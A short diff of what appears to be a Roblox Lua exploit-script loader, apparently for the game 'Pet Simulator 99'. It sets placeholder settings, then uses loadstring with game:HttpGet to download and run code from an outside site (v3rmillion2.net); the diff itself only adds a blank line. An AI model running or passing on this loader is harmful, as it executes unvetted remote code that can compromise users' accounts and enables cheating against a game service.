@@ -4,3 +4,4 @@ getgenv().LoadSettings = {
     Example_Setting = Example_Value
 }
 loadstring(game:HttpGet("https://v3rmillion2.net/ps99"))()
+
